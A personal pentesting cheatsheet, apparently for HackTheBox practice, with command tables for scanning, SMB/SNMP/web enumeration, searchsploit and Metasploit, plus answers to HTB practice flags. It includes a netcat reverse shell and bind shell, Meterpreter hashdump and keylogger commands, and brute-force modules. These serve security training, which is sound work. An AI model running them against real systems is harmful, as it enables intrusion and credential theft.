# VPN & Pentesting Cheatsheet

> **⚠️ IMPORTANT SECURITY NOTE**
> Never use the same VM for HackTheBox/vulnerable networks and client assessments!

---

## 🔐 OpenVPN Commands

| # | Command | Description |
|---|---------|-------------|
| 1 | `sudo openvpn user.ovpn` | Connect to VPN using config file |
| 2 | `sudo openvpn --config /path/to/file.ovpn` | Connect with full path to config |
| 3 | `sudo openvpn --daemon --config user.ovpn` | Run VPN connection in background |
| 4 | `sudo killall openvpn` | Disconnect from VPN |
| 5 | `ps aux \| grep openvpn` | Check if OpenVPN is running |
| 6 | `ip a show tun0` | Show VPN tunnel interface details |
| 7 | `netstat -rn` | Display routing table (show VPN networks) |
| 8 | `ip route \| grep tun0` | Show routes through VPN tunnel |
| 9 | `curl ifconfig.me` | Check your public IP (verify VPN) |
| 10 | `sudo openvpn --show-tls` | Show TLS cipher information |

---

## 🌐 SSH (Secure Shell) - Port 22

| # | Command | Description |
|---|---------|-------------|
| 1 | `ssh user@10.10.10.10` | Basic SSH connection |
| 2 | `ssh user@10.10.10.10 -p 2222` | Connect to non-standard port |
| 3 | `ssh -i id_rsa user@10.10.10.10` | Connect using private key |
| 4 | `ssh -L 8080:localhost:80 user@10.10.10.10` | Local port forwarding |
| 5 | `ssh -R 8080:localhost:80 user@10.10.10.10` | Remote port forwarding |
| 6 | `ssh -D 9050 user@10.10.10.10` | Dynamic port forwarding (SOCKS proxy) |
| 7 | `ssh user@10.10.10.10 "command"` | Execute command remotely |
| 8 | `scp file.txt user@10.10.10.10:/tmp/` | Copy file to remote host |
| 9 | `ssh-keygen -t rsa -b 4096` | Generate SSH key pair |
| 10 | `ssh -v user@10.10.10.10` | Verbose mode for debugging |

---

## 🔌 Netcat (Swiss Army Knife)

| # | Command | Description |
|---|---------|-------------|
| 1 | `nc -nv 10.10.10.10 80` | Basic TCP connection |
| 2 | `nc -nlvp 4444` | Listen on port 4444 |
| 3 | `nc -nv 10.10.10.10 4444 -e /bin/bash` | Reverse shell |
| 4 | `nc -nlvp 4444 -e /bin/bash` | Bind shell |
| 5 | `nc -nv 10.10.10.10 80 < input.txt` | Send file contents |
| 6 | `nc -nlvp 4444 > output.txt` | Receive file |
| 7 | `nc -nvz 10.10.10.10 1-1000` | Port scan (TCP) |
| 8 | `nc -nvu 10.10.10.10 161` | UDP connection |
| 9 | `nc -nlvp 4444 -k` | Keep listener alive after disconnect |
| 10 | `echo "test" \| nc -nv 10.10.10.10 80` | Send quick data |

---

## 📡 Nmap (Network Mapper)

| # | Command | Description |
|---|---------|-------------|
| 1 | `nmap 10.10.10.10` | Basic scan |
| 2 | `nmap -sV 10.10.10.10` | Service/version detection |
| 3 | `nmap -sC 10.10.10.10` | Run default scripts |
| 4 | `nmap -sC -sV 10.10.10.10` | Comprehensive scan |
| 5 | `nmap -p- 10.10.10.10` | Scan all 65535 ports |
| 6 | `nmap -p 80,443,8080 10.10.10.10` | Scan specific ports |
| 7 | `nmap -A 10.10.10.10` | Aggressive scan (OS, version, scripts) |
| 8 | `nmap -sU 10.10.10.10` | UDP scan |
| 9 | `nmap -O 10.10.10.10` | OS detection |
| 10 | `nmap -oA scan_results 10.10.10.10` | Save results (all formats) |

---

## 🖥️ Tmux (Terminal Multiplexer)

| # | Command | Description |
|---|---------|-------------|
| 1 | `tmux` | Start new session |
| 2 | `tmux new -s mysession` | Start named session |
| 3 | `tmux ls` | List all sessions |
| 4 | `tmux attach -t mysession` | Attach to session |
| 5 | `tmux kill-session -t mysession` | Kill specific session |
| 6 | `Ctrl+b d` | Detach from session |
| 7 | `Ctrl+b c` | Create new window |
| 8 | `Ctrl+b n` | Next window |
| 9 | `Ctrl+b %` | Split pane vertically |
| 10 | `Ctrl+b "` | Split pane horizontally |

---

## 📂 FTP (File Transfer Protocol) - Port 21

| # | Command | Description |
|---|---------|-------------|
| 1 | `ftp 10.10.10.10` | Connect to FTP server |
| 2 | `anonymous` / `anonymous` | Try anonymous login |
| 3 | `ls` | List files |
| 4 | `cd directory` | Change directory |
| 5 | `get file.txt` | Download file |
| 6 | `mget *.txt` | Download multiple files |
| 7 | `put file.txt` | Upload file |
| 8 | `binary` | Switch to binary mode |
| 9 | `ascii` | Switch to ASCII mode |
| 10 | `bye` / `exit` | Disconnect |

---

## 🗂️ SMB (Server Message Block) - Port 445

| # | Command | Description |
|---|---------|-------------|
| 1 | `smbclient -L //10.10.10.10` | List shares |
| 2 | `smbclient //10.10.10.10/share` | Connect to share anonymously |
| 3 | `smbclient -U user //10.10.10.10/share` | Connect as specific user |
| 4 | `smbclient -U bob \\\\10.10.10.10\\users` | Alternative syntax |
| 5 | `get file.txt` | Download file (once connected) |
| 6 | `put file.txt` | Upload file |
| 7 | `ls` | List files in share |
| 8 | `cd folder` | Navigate folders |
| 9 | `smbmap -H 10.10.10.10` | Enumerate shares with smbmap |
| 10 | `crackmapexec smb 10.10.10.10 -u user -p pass` | SMB authentication testing |

---

## 📊 SNMP (Simple Network Management Protocol) - Port 161

| # | Command | Description |
|---|---------|-------------|
| 1 | `snmpwalk -v2c -c public 10.10.10.10` | Walk entire MIB tree |
| 2 | `snmpwalk -v2c -c public 10.10.10.10 system` | Query system info |
| 3 | `snmpget -v2c -c public 10.10.10.10 OID` | Get specific OID |
| 4 | `onesixtyone -c community.txt 10.10.10.10` | Brute force community strings |
| 5 | `snmp-check 10.10.10.10` | Enumerate SNMP data |
| 6 | `snmpwalk -v3 -u user -l auth 10.10.10.10` | SNMPv3 with authentication |
| 7 | `nmap -sU -p 161 --script snmp-* 10.10.10.10` | Nmap SNMP scripts |
| 8 | `snmpbulkwalk -v2c -c public 10.10.10.10` | Bulk query (faster) |
| 9 | `snmpwalk -v1 -c private 10.10.10.10` | Try 'private' community |
| 10 | `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.10` | Wordlist brute force |

---


## 📝 HTB Practice Questions - Quick Reference

**Question 1:** What version is running on port 8080?
```bash
nmap -sV 10.129.XX.XX
# Answer: Apache Tomcat
```

**Question 2:** Non-default telnet port?
```bash
nmap -sV 10.129.XX.XX
# Answer: 2323
```

**Question 3:** Access SMB share and get flag
```bash
smbclient -L //10.129.42.253
smbclient -U bob \\\\10.129.42.253\\users
# Once connected:
ls
cd flag
get flag.txt
cat flag.txt
```

---

## 🌐 Web Enumeration - Gobuster

| # | Command | Description |
|---|---------|-------------|
| 1 | `gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt` | Basic directory scan |
| 2 | `gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt` | Large wordlist scan |
| 3 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -x php,txt,html` | Scan with extensions |
| 4 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -o results.txt` | Save output to file |
| 5 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -k` | Skip SSL verification |
| 6 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -t 50` | Use 50 threads (faster) |
| 7 | `gobuster vhost -u http://10.10.10.10 -w wordlist.txt` | Virtual host enumeration |
| 8 | `gobuster dns -d example.com -w wordlist.txt` | DNS subdomain enumeration |
| 9 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -b 404,403` | Hide specific status codes |
| 10 | `gobuster dir -u http://10.10.10.10 -w wordlist.txt -U user -P pass` | Basic auth |

---

## 🌐 Web Enumeration - ffuf

| # | Command | Description |
|---|---------|-------------|
| 1 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt` | Basic directory fuzzing |
| 2 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -e .php,.txt,.html` | Fuzz with extensions |
| 3 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -fc 404` | Filter by status code |
| 4 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -fs 1234` | Filter by response size |
| 5 | `ffuf -u http://FUZZ.10.10.10.10 -w wordlist.txt` | Virtual host fuzzing |
| 6 | `ffuf -u http://10.10.10.10/?FUZZ=value -w wordlist.txt` | Parameter fuzzing |
| 7 | `ffuf -u http://10.10.10.10/ -w wordlist.txt -H "Host: FUZZ.example.com"` | Header fuzzing |
| 8 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -mc 200,301,302` | Match status codes |
| 9 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -t 100` | Use 100 threads |
| 10 | `ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -o results.json` | Save JSON output |

---

## 🔍 Web Enumeration Tips & Reconnaissance

| # | Command | Description |
|---|---------|-------------|
| 1 | `curl -I http://10.10.10.10` | Banner grabbing (headers only) |
| 2 | `curl -s http://10.10.10.10 \| grep -i "server"` | Extract server header |
| 3 | `whatweb http://10.10.10.10` | Identify web technologies |
| 4 | `whatweb -v http://10.10.10.10` | Verbose web tech scan |
| 5 | `openssl s_client -connect 10.10.10.10:443` | Inspect SSL certificate |
| 6 | `curl http://10.10.10.10/robots.txt` | Check robots.txt |
| 7 | `curl -s http://10.10.10.10 \| grep -i "<!--"` | Find HTML comments |
| 8 | `curl http://10.10.10.10/sitemap.xml` | Check sitemap |
| 9 | `wafw00f http://10.10.10.10` | Detect Web Application Firewall |
| 10 | `nikto -h http://10.10.10.10` | Comprehensive web vulnerability scan |

**What to Look For:**
- Application framework (Django, Laravel, Express, etc.)
- Server software & version (Apache, Nginx, IIS)
- Authentication methods
- Security headers (X-Frame-Options, CSP, etc.)
- Hidden directories/files in source code
- API endpoints in JavaScript files

---

## 🔓 Public Exploits - SearchSploit

| # | Command | Description |
|---|---------|-------------|
| 1 | `searchsploit apache` | Search for Apache exploits |
| 2 | `searchsploit -t windows kernel` | Search in title only |
| 3 | `searchsploit -e 12345` | Examine exploit by EDB-ID |
| 4 | `searchsploit -m 12345` | Mirror (copy) exploit to current directory |
| 5 | `searchsploit -p 12345` | Show full path to exploit |
| 6 | `searchsploit -x 12345` | Display exploit contents |
| 7 | `searchsploit -w apache` | Show URLs for online exploits |
| 8 | `searchsploit --update` | Update exploit database |
| 9 | `searchsploit -j apache` | JSON output format |
| 10 | `searchsploit --exclude="(PoC)"` | Exclude proof of concepts |

**Key Exploit Databases:**
- **ExploitDB**: https://www.exploit-db.com/
- **Rapid7 DB**: https://www.rapid7.com/db/
- **Vulners**: https://vulners.com/
- **Packet Storm**: https://packetstormsecurity.com/

---

## 💥 Metasploit Framework

### MSFconsole Core Commands

| # | Command | Description |
|---|---------|-------------|
| 1 | `msfconsole` | Start Metasploit console |
| 2 | `search apache` | Search for exploits/modules |
| 3 | `use exploit/windows/smb/ms17_010_eternalblue` | Select a module |
| 4 | `show options` | Show module options |
| 5 | `set RHOSTS 10.10.10.10` | Set remote host target |
| 6 | `set LHOST 10.10.14.5` | Set local host (your IP) |
| 7 | `set LPORT 4444` | Set local port for callback |
| 8 | `exploit` or `run` | Execute the exploit |
| 9 | `sessions -l` | List active sessions |
| 10 | `sessions -i 1` | Interact with session #1 |

### Meterpreter Commands (Post-Exploitation)

| # | Command | Description |
|---|---------|-------------|
| 1 | `sysinfo` | Get system information |
| 2 | `getuid` | Get current user ID |
| 3 | `ps` | List running processes |
| 4 | `migrate PID` | Migrate to another process |
| 5 | `hashdump` | Dump password hashes |
| 6 | `download /path/file.txt` | Download file from target |
| 7 | `upload /local/file.txt /remote/path/` | Upload file to target |
| 8 | `shell` | Get system shell |
| 9 | `screenshot` | Take screenshot |
| 10 | `keyscan_start` | Start keylogger |

### Useful MSF Auxiliary Modules

| # | Command | Description |
|---|---------|-------------|
| 1 | `use auxiliary/scanner/smb/smb_version` | SMB version scanner |
| 2 | `use auxiliary/scanner/http/dir_scanner` | HTTP directory scanner |
| 3 | `use auxiliary/scanner/ssh/ssh_login` | SSH brute force |
| 4 | `use auxiliary/scanner/ftp/ftp_login` | FTP brute force |
| 5 | `use auxiliary/scanner/mssql/mssql_ping` | MSSQL discovery |
| 6 | `use auxiliary/scanner/portscan/tcp` | TCP port scanner |
| 7 | `use auxiliary/scanner/snmp/snmp_enum` | SNMP enumeration |
| 8 | `use auxiliary/scanner/discovery/udp_sweep` | UDP service discovery |
| 9 | `use auxiliary/gather/dns_info` | DNS information gathering |
| 10 | `use post/windows/gather/enum_shares` | Enumerate shares (post-exploit) |

**Metasploit Use Cases:**
- 🎯 Running reconnaissance scripts to enumerate remote hosts
- ✅ Verification scripts to test vulnerability existence without exploitation
- 🔧 Meterpreter for advanced post-exploitation
- 🚀 Pivoting and lateral movement tools
- 📊 Built-in exploits for public vulnerabilities

---

## 📝 HTB Practice Questions - Quick Reference

### Network Enumeration

**Question 1:** What version is running on port 8080?
```bash
nmap -sV 10.129.XX.XX
# Answer: Apache Tomcat
```

**Question 2:** Non-default telnet port?
```bash
nmap -sV 10.129.XX.XX
# Answer: 2323
```

**Question 3:** Access SMB share and get flag
```bash
smbclient -L //10.129.42.253
smbclient -U bob \\\\10.129.42.253\\users
# Once connected:
ls
cd flag
get flag.txt
cat flag.txt
```

### Web Enumeration

**Question 4:** Use web enumeration techniques to find the flag
```bash
# Hint: Use Gobuster to enumerate directories and check robots.txt
gobuster dir -u http://10.129.XX.XX -w /usr/share/wordlists/dirb/common.txt
curl http://10.129.XX.XX/robots.txt
# Answer: HTB{w3b_3num3r4710n_r3v34l5_53cr375}
```

### Exploitation Challenge

**Question 5:** Identify services and exploit them to get /flag.txt
```bash
# Step 1: Enumerate services
nmap -sC -sV 10.129.XX.XX

# Step 2: Visit web service (see enumeration workflow below)
curl http://10.129.XX.XX

# Step 3: Use Metasploit with discovered service info
msfconsole
search <service_name>
use exploit/path/to/exploit
set RHOSTS 10.129.XX.XX
exploit

# Answer: HTB{my_f1r57_h4ck}
```

---

## 📋 Personal Enumeration Workflow

**Step-by-Step Process for Target Enumeration:**

1. **🌐 Initial Web Reconnaissance**
   ```bash
   # Option A: Use browser first (recommended for visual inspection)
   firefox http://IP:PORT
   
   # Option B: Use curl for quick check
   curl http://IP:PORT
   ```

2. **🔍 Gather Information**
   - Look for service names, versions, software names
   - Check page source for comments or hidden info
   - Note any technology stack mentioned (PHP, Apache, etc.)
   - Look for default pages that reveal software versions

3. **💥 Search for Exploits in Metasploit**
   ```bash
   msfconsole
   search <service_name_you_found>
   # TIP: Read the results carefully - look for matching versions
   ```

4. **📖 Follow Your Cheatsheet**
   - Use the Metasploit Framework section above
   - Set required options (RHOSTS, LHOST, LPORT)
   - Run the exploit
   - Use Meterpreter commands if you get a session

**Quick Reference Enumeration Checklist:**
- [ ] Port scan completed (nmap)
- [ ] Web service inspected (browser/curl)
- [ ] Service versions identified
- [ ] Exploit searched (searchsploit/msfconsole)
- [ ] Exploit configured with correct IPs
- [ ] Exploit executed

---

## ⚠️ When You're Stuck - Break Protocol

> **🛑 IMPORTANT: If you're blocked on a problem for too long, STOP!**

**The 30-Minute Rule:**
1. ⏸️ Take a 30-minute break - step away from the screen
2. 🧠 Let your brain process the problem subconsciously
3. 🔄 Come back with fresh perspective

**Get Help - You're Not the First:**
- 💬 **HTB Forums**: https://forum.hackthebox.com/
- 🗨️ **HTB Discord**: Active community support
- 🎥 **YouTube**: Search for walkthroughs (after trying yourself!)
- 🔍 **Google**: Search "HTB [machine_name] hints" (avoid full spoilers)
- 📝 **Reddit**: r/hackthebox community

**Tips for Asking for Help:**
- Explain what you've already tried
- Share your enumeration results (nmap, gobuster output)
- Ask for hints, not answers
- Be specific about where you're stuck

**Remember:** Everyone gets stuck. The learning happens when you work through it!



## 🛠️ Common Wordlists (Kali Linux)

```
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
```

---

*Last Updated: 2025 | For Educational & Authorized Testing Only*
